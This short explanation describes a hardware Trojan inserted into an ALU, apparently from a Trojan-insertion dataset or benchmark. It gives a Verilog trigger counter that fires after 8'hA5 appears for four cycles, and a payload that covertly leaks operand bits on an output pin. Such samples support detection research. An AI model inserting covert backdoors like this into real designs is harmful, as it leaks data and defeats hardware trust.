Explanation:
A hardware Trojan was inserted that activates after seeing a secret 8'hA5 pattern on an input for four consecutive cycles, then covertly leaks the LSB of internal signal 'a' on a dedicated output pin. The ALU's original operations and outputs are unchanged.

Trigger:
sequence 8'hA5 on trojan_trigger_signal 4 cycles in a row
        if (trojan_trigger_signal == 8'hA5) begin
            if (trojan_counter < 4'd4)
                trojan_counter <= trojan_counter + 1'b1;
        end else begin
            trojan_counter <= 4'd0;
        end

Payload:
Once triggered, the Trojan leaks the least significant bit of operand 'a' to the trojan_leak output on every clock cycle, allowing external observation of internal data.
